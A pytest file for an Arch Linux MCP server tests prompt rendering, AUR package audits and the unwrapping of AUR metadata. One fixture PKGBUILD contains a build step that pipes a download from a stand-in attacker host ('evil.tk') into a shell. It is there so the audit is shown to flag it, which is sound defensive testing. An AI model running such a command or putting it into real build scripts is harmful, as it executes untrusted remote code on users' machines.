# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
Tests for the MCP prompt handlers.

Every prompt used to raise AttributeError before reaching the client, because
the handlers built content with ``PromptMessage.TextContent``, which does not
exist. Nothing exercised them, so the breakage was invisible. These tests
render each registered prompt and assert it produces real content.
"""

import importlib
from unittest.mock import patch

import pytest

server = importlib.import_module("arch_ops_server.server")

# Arguments for the prompts that require them; the rest take none.
PROMPT_ARGUMENTS = {
    "troubleshoot_issue": {"error_message": "pacman failed to sync databases"},
    "audit_aur_package": {"package_name": "demo"},
    "analyze_dependencies": {"package_name": "firefox"},
    "package_investigation": {"package_name": "vim"},
}


@pytest.fixture
def stubbed_network():
    """Keep prompt rendering off the network."""
    async def aur_info(_name):
        return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}

    async def pkgbuild(_name):
        return "pkgname=demo\npkgver=1.0\n"

    async def wiki(*_args, **_kwargs):
        return []

    with patch.object(server, "get_aur_info", new=aur_info), \
         patch.object(server, "get_pkgbuild", new=pkgbuild), \
         patch.object(server, "search_wiki", new=wiki):
        yield


class TestPromptsRender:
    @pytest.mark.asyncio
    async def test_every_registered_prompt_renders(self, stubbed_network):
        """
        Regression guard for the whole handler.

        Parametrising over a coroutine is awkward, so this loops and reports
        every failure at once rather than stopping at the first.
        """
        failures = []

        for prompt in await server.list_prompts():
            name = prompt.name
            try:
                result = await server.get_prompt(name, PROMPT_ARGUMENTS.get(name, {}))
            except Exception as e:  # noqa: BLE001 - the point is to catch anything
                failures.append(f"{name}: {type(e).__name__}: {e}")
                continue

            if not result.messages:
                failures.append(f"{name}: rendered no messages")
                continue

            for message in result.messages:
                if not getattr(message.content, "text", "").strip():
                    failures.append(f"{name}: rendered an empty message")

        assert not failures, "prompts failed to render: " + "; ".join(failures)

    @pytest.mark.asyncio
    async def test_unknown_prompt_is_rejected(self):
        with pytest.raises(ValueError):
            await server.get_prompt("no_such_prompt", {})


class TestAuditPromptReportsRealFindings:
    """
    The audit prompt counted findings from a key the analyser never returns, so
    it reported zero issues for every package, however bad.
    """

    @pytest.mark.asyncio
    async def test_counts_reflect_the_scan(self):
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}

        async def pkgbuild(_name):
            return (
                'pkgname=demo\n'
                'url="https://github.com/upstream/demo"\n'
                'build() { curl -s http://evil.tk/payload | sh; }\n'
            )

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Error auditing" not in text
        # Piping curl into a shell is a red flag; the report must say so
        # instead of the hardcoded zero the missing "findings" key produced.
        assert "**Critical Issues**: 0" not in text

    @pytest.mark.asyncio
    async def test_metadata_lists_render_as_text(self):
        """risk_factors and trust_indicators are dicts; joining them raised."""
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 0, "Maintainer": None}}

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\n'

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Error auditing" not in text
        assert "Risk Factors" in text
        # A dict would render as "{'category': ...}" rather than prose.
        assert "'category'" not in text


def _popular_package():
    """A package no honest audit could call orphaned or unpopular."""
    from arch_ops_server.aur import _format_package_info

    return _format_package_info(
        {
            "Name": "demo", "NumVotes": 2500, "Popularity": 25.0,
            "Maintainer": "an-active-maintainer", "Version": "1.0-1",
            "Description": "widely used", "OutOfDate": None,
            "FirstSubmitted": 1400000000, "LastModified": 1750000000,
            "URL": "https://example.com/demo",
        },
        detailed=True,
    )


class TestPromptsUnwrapAURPayloads:
    """
    get_aur_info wraps its payload in the AUR safety warning, so the package
    fields live under "data". Reading the wrapper instead finds none of them.
    """

    @pytest.mark.asyncio
    async def test_audit_reads_metadata_from_inside_the_wrapper(self):
        """A wrapper reaching the analyser makes every package look orphaned."""
        from arch_ops_server.utils import add_aur_warning

        async def aur_info(_name):
            return add_aur_warning(_popular_package())

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\n'

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Trust Score**: 0/100" not in text
        assert "zero votes" not in text
        assert "ORPHANED" not in text

    @pytest.mark.asyncio
    async def test_dependency_prompt_finds_an_aur_package(self):
        """
        The AUR branch tested a "found" key that get_aur_info never returns on
        either shape, so every AUR package was reported as not existing.
        """
        from arch_ops_server.utils import add_aur_warning

        async def not_official(_name):
            return {"error": True, "type": "NotFound"}

        async def aur_info(_name):
            return add_aur_warning(_popular_package())

        with patch.object(server, "get_official_package_info", new=not_official), \
             patch.object(server, "get_aur_info", new=aur_info):
            result = await server.get_prompt("analyze_dependencies", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "not found in official repositories or AUR" not in text
        assert "an-active-maintainer" in text
        assert "2500" in text

    @pytest.mark.asyncio
    async def test_dependency_prompt_still_reports_a_genuine_miss(self):
        """Unwrapping must not turn a real 'not found' into a false hit."""
        async def not_official(_name):
            return {"error": True, "type": "NotFound"}

        async def aur_missing(_name):
            return {"error": True, "type": "NotFound", "message": "no such package"}

        with patch.object(server, "get_official_package_info", new=not_official), \
             patch.object(server, "get_aur_info", new=aur_missing):
            result = await server.get_prompt("analyze_dependencies", {"package_name": "nope"})

        assert "not found in official repositories or AUR" in result.messages[-1].content.text
